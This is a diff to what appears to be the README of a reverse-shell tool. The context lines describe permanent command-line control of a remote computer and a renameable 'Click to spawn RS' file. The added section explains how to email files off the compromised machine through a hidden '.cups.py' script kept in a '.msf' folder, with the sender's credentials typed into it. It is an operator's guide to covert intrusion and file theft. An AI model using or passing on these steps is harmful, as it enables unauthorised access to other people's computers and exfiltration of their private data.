@@ -7,3 +7,10 @@
 7. You have permanent access to the remote computer, can control it via the command line 
 
 NOTE: File "Click to spawn RS" can be renamed to whatever you like.
+
+
+EMAIL FILES TO YOURSELF:
+1. To email any file to yourself, you must set up two email accounts, one to send the file (sending email) and one to receive the file (receiving email). Edit the cups.py file inside the .msf folder and input a receiving and sending email address, as well as the password for the sending email.
+
+2. To send a file to yourself once reverse shell is spawned and a connection has been made, enter the home directory (type "cd") and then enter "python .cups.py PATH_TO FILE" e.g. "python .cups.py ~/Desktop/funnyPic.jpg" 
+
